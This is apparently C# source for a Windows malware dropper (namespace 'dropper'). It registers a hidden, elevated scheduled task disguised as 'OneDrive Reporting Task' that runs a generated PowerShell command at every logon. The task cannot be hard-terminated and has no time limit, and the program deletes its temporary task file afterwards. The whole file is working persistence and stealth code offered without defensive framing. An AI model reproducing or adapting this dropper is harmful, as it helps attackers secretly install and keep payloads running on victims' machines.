using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace dropper
{
    internal class Program
    {
        private static string token = "";
        private static string prefix = "";
        private static string geolock = "";

        static void Main(string[] args)
        {
            Process schproc = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "schtasks.exe",
                    Arguments = "/query /tn \"OneDrive Reporting Task\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                }
            };
            schproc.Start();
            string error = schproc.StandardError.ReadToEnd();
            schproc.WaitForExit();
            if (error == string.Empty) Environment.Exit(1);

            string xmlpath = Path.GetTempFileName();
            File.WriteAllText(xmlpath,
@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>" + PGen.GenerateCommand(token, prefix, geolock, new Random()) + @"</Arguments>
    </Exec>
  </Actions>
</Task>");

            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/create /tn \"OneDrive Reporting Task\" /xml " + xmlpath,
                WindowStyle = ProcessWindowStyle.Hidden,
                Verb = "runas"
            }).WaitForExit();

            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                Verb = "runas"
            }).WaitForExit();

            File.Delete(xmlpath);
        }
    }
}